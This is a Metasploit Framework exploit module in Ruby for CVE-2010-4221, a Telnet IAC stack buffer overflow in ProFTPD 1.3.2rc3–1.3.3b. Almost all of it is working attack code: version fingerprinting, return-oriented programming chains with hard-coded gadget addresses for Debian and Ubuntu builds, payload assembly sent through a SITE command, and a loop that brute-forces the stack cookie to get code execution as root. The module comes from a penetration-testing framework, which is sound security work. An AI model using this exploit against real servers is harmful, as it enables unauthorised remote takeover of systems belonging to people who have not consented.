##
# $Id: proftp_telnet_iac.rb 11525 2011-01-09 23:33:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	#include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in versions of ProFTPD
				server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a
				large number of Telnet IAC commands, an attacker can corrupt memory and
				execute arbitrary code.

				The Debian Squeeze version of the exploit uses a little ROP stub to indirectly
				transfer the flow of execution to a pool buffer (the cmd_rec "res" in
				"pr_cmd_read").

				The Ubuntu version uses a full-blow ROP to mmap RWX memory, copy a small stub
				to it, and execute the stub. The stub then copies the remainder of the payload
				in and executes it.

				NOTE: Most Linux distributions either do not ship a vulnerable version of
				ProFTPD, or they ship a version compiled with stack smashing protection.

				Although SSP significantly reduces the probability of a single attempt
				succeeding, it will not prevent exploitation. Since the daemon forks in a
				default configuration, the cookie value will remain the same despite
				some attemtps failing. By making repeated requests, an attacker can eventually
				guess the cookie value and exploit the vulnerability.

				The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness
				and could allow exploitation in semi-reasonable amount of time.
			},
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision: 11525 $',
			'References'     =>
				[
					['CVE', '2010-4221'],
					['OSVDB', '68985'],
					['BID', '44562']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'PrependChrootBreak' => true
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 4096,
					# NOTE: \xff are avoided here so we can control the number of them being sent.
					'BadChars' => "\x09\x0a\x0b\x0c\x0d\x20\xff",
					'DisableNops'	=>  'True',
				},
			'Platform'       => [ 'linux' ],
			'Targets'        =>
			[
				#
				# Automatic targeting via fingerprinting
				#
				[ 'Automatic Targeting', { 'auto' => true }  ],

				#
				# This special one comes first since we dont want its index changing.
				#
				[	'Debug',
					{
						'IACCount' => 8192, # should cause crash writing off end of stack
						'Offset' => 0,
						'Ret' => 0x41414242,
						'Writable' => 0x43434545
					}
				],

				#
				# specific targets
				#

				# NOTE: this minimal rop works most of the time, but it can fail
				# if the proftpd pool memory is in a different order for whatever reason...
				[ 'ProFTPD 1.3.3a Server (Debian) - Squeeze Beta1',
					{
						'IACCount' => 4096+16,
						'Offset' => 0x102c-4,
						# NOTE: All addresses are from the proftpd binary
						'Ret' => 0x805a547, # pop esi / pop ebp / ret
						'Writable' => 0x80e81a0, # .data
						'RopStack' =>
							[
								# Writable is here
								0xcccccccc, # unused
								0x805a544,  # mov eax,esi / pop ebx / pop esi / pop ebp / ret
								0xcccccccc, # becomes ebx
								0xcccccccc, # becomes esi
								0xcccccccc, # becomes ebp
								# quadruple deref the res pointer :)
								0x8068886,  # mov eax,[eax] / ret
								0x8068886,  # mov eax,[eax] / ret
								0x8068886,  # mov eax,[eax] / ret
								0x8068886,  # mov eax,[eax] / ret
								# skip the pool chunk header
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								0x805bd8e,  # inc eax / adc cl, cl / ret
								# execute the data :)
								0x0805c26c, # jmp eax
							],
					}
				],

				# For the version compiled with symbols :)
				[ 'ProFTPD 1_3_3a Server (Debian) - Squeeze Beta1 (Debug)',
					{
						'IACCount' => 4096+16,
						'Offset' => 0x1028-4,
						# NOTE: All addresses are from the proftpd binary
						'Writable' => 0x80ec570, # .data
						'Ret' => 0x80d78c2, # pop esi / pop ebp / ret
						'RopStack' =>
							[
								# Writable is here
								#0x0808162a, # jmp esp (works w/esp fixup)
								0xcccccccc, # unused becomes ebp
								0x80d78c2,  # mov eax,esi / pop esi / pop ebp / ret
								0xcccccccc, # unused becomes esi
								0xcccccccc, # unused becomes ebp
								# quadruple deref the res pointer :)
								0x806a915,  # mov eax,[eax] / pop ebp / ret
								0xcccccccc, # unused becomes ebp
								0x806a915,  # mov eax,[eax] / pop ebp / ret
								0xcccccccc, # unused becomes ebp
								0x806a915,  # mov eax,[eax] / pop ebp / ret
								0xcccccccc, # unused becomes ebp
								0x806a915,  # mov eax,[eax] / pop ebp / ret
								0xcccccccc, # unused becomes ebp
								# skip the pool chunk header
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								0x805d6a9,  # inc eax / adc cl, cl / ret
								# execute the data :)
								0x08058de6, # jmp eax
							],
					}
				],

				[ 'ProFTPD 1.3.2c Server (Ubuntu 10.04)',
					{
						'IACCount' => 1018,
						'Offset' => 0x420,
						'CookieOffset' => -0x20,
						'Writable' => 0x80db3a0, # becomes esi (beginning of .data)
						'Ret' => 0x805389b,  # pop esi / pop ebp / ret
						'RopStack' =>
							[
								0xcccccccc, # becomes ebp

								0x8080f04,  # pop eax / ret
								0x80db330,  # becomes eax (GOT of mmap64)

								0x806a716,  # mov eax, [eax] / ret
								0x805dd5c,  # jmp eax
								0x80607b2,  # add esp, 0x24 / pop ebx / pop ebp / ret
								# mmap args
								0, 0x20000, 0x7, 0x22, 0xffffffff, 0,
								0, # unused
								0xcccccccc, # unused
								0xcccccccc, # unused
								0x100000000 - 0x5d5b24c4 + 0x80db3a4, # becomes ebx
								0xcccccccc, # becomes ebp

								# note, ebx gets fixed above :)
								# 0xfe in 'ah' doesn't matter since we have more than enough space.
								# now, load an instruction to store to eax
								0x808b542,  # pop edx / mov ah, 0xfe / inc dword ptr [ebx+0x5d5b24c4] / ret
								# becomes edx - mov [eax+ebp*4]; ebx / ret
								"\x89\x1c\xa8\xc3".unpack('V').first,

								# store it :)
								0x805c2d0,  # mov [eax], edx / add esp, 0x10 / pop ebx / pop esi / pop ebp / ret
								0xcccccccc, # unused
								0xcccccccc, # unused
								0xcccccccc, # unused
								0xcccccccc, # unused
								0xcccccccc, # becomes ebx
								0xcccccccc, # becomes esi
								0xcccccccc, # becomes ebp

								# Copy the following stub:
								#"\x8d\xb4\x24\x21\xfb\xff\xff" # lea esi, [esp-0x4df]
								#"\x8d\x78\x12"  # lea edi, [eax+0x12]
								#"\x6a\x7f"   # push 0x7f
								#"\x59"	    # pop ecx
								#"\xf2\xa5"   # rep movsd

								0x80607b5,  # pop ebx / pop ebp / ret
								0xfb2124b4, # becomes ebx
								1, # becomes ebp
								0x805dd5c,  # jmp eax

								0x80607b5,  # pop ebx / pop ebp / ret
								0x788dffff, # becomes ebx
								2, # becomes ebp
								0x805dd5c,  # jmp eax

								0x80607b5,  # pop ebx / pop ebp / ret
								0x597f6a12, # becomes ebx
								3, # becomes ebp
								0x805dd5c,  # jmp eax

								0x80607b5,  # pop ebx / pop ebp / ret
								0x9090a5f2, # becomes ebx
								4, # becomes ebp
								0x805dd5c,  # jmp eax

								0x80607b5,  # pop ebx / pop ebp / ret
								0x8d909090, # becomes ebx
								0, # becomes ebp
								0x805dd5c,  # jmp eax

								# hopefully we dont get here
								0xcccccccc,
							],
					}
				]

			],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 1 2010'))

		register_options(
			[
				Opt::RPORT(21),
			], self.class )
	end


	def check
		# NOTE: We don't care if the login failed here...
		ret = connect
		banner = sock.get_once

		# We just want the banner to check against our targets..
		print_status("FTP Banner: #{banner.strip}")

		status = CheckCode::Safe
		if banner =~ /ProFTPD (1\.3\.[23][^ ])/i
			ver = $1
			maj,min,rel = ver.split('.')
			relv = rel.slice!(0,1)
			case relv
			when '2'
				if rel.length > 0
					if rel[0,2] == 'rc'
						if rel[2,rel.length].to_i >= 3
							status = CheckCode::Vulnerable
						end
					else
						status = CheckCode::Vulnerable
					end
				end
			when '3'
				# 1.3.3+ defaults to vulnerable (until >= 1.3.3c)
				status = CheckCode::Vulnerable
				if rel.length > 0
					if rel[0,2] != 'rc' and rel[0,1] > 'b'
						status = CheckCode::Safe
					end
				end
			end
		end

		disconnect
		return status
	end


	def exploit
		connect
		banner = sock.get_once

		# Use a copy of the target
		mytarget = target

		if (target['auto'])
			mytarget = nil

			print_status("Automatically detecting the target...")
			if (banner and (m = banner.match(/ProFTPD (1\.3\.[23][^ ]) Server/i))) then
				print_status("FTP Banner: #{banner.strip}")
				version = m[1]
			else
				raise RuntimeError, "No matching target"
			end

			regexp = Regexp.escape(version)
			self.targets.each do |t|
				if (t.name =~ /#{regexp}/) then
					mytarget = t
					break
				end
			end

			if (not mytarget)
				raise RuntimeError, "No matching target"
			end

			print_status("Selected Target: #{mytarget.name}")
		else
			print_status("Trying target #{mytarget.name}...")
			if banner
				print_status("FTP Banner: #{banner.strip}")
			end
		end

		#puts "attach and press any key"; bleh = $stdin.gets

		buf = ''
		buf << 'SITE '

		#buf << "\xcc"
		if mytarget['CookieOffset']
			buf << "\x8d\xa0\xfc\xdf\xff\xff"  # lea esp, [eax-0x2004]
		end
		buf << payload.encoded

		# The number of characters left must be odd at this point.
		buf << rand_text(1) if (buf.length % 2) == 0
		buf << "\xff" * (mytarget['IACCount'] - payload.encoded.length)

		buf << rand_text_alphanumeric(mytarget['Offset'] - buf.length)

		addrs = [
			mytarget['Ret'],
			mytarget['Writable']
		].pack('V*')

		if mytarget['RopStack']
			addrs << mytarget['RopStack'].map { |e|
				if e == 0xcccccccc
					rand_text(4).unpack('V').first
				else
					e
				end
			}.pack('V*')
		end

		# Make sure we didn't introduce instability
		addr_badchars = "\x09\x0a\x0b\x0c\x20"
		if idx = Rex::Text.badchar_index(addrs, addr_badchars)
			raise RuntimeError, ("One or more address contains a bad character! (0x%02x @ 0x%x)" % [addrs[idx,1].unpack('C').first, idx])
		end

		buf << addrs
		buf << "\r\n"


		#
		# In the case of Ubuntu, the cookie has 24-bits of entropy. Further more, it
		# doesn't change while proftpd forks children. Therefore, we can try forever
		# and eventually guess it correctly.
		#
		# NOTE: if the cookie contains one of our bad characters, we're SOL.
		#
		if mytarget['CookieOffset']
			print_status("!!! Attempting to bruteforce the cookie value! This can takes days. !!!")

			disconnect

			max = 0xffffff00
			off = mytarget['Offset'] + mytarget['CookieOffset']

			cookie = last_cookie = 0
			#cookie = 0x17ccd600

			start = Time.now
			last = start - 10

			while not session_created?
				now = Time.now
				if (now - last) >= 10
					perc = (cookie * 100) / max
					qps = ((cookie - last_cookie) >> 8) / 10.0
					print_status("%.2f%% complete, %.2f attempts/sec - Trying: 0x%x" % [perc, qps, cookie])
					last = now
					last_cookie = cookie
				end

				sd = connect(false)
				sd.get_once
				buf[off, 4] = [cookie].pack('V')
				sd.put(buf)
				disconnect(sd)

				cookie += 0x100
				break if cookie > max
			end

			if not session_created?
				raise RuntimeError, "Unable to guess the cookie value, sorry :-/"
			end
		else
			sock.put(buf)
			disconnect
		end

		handler
	end

end
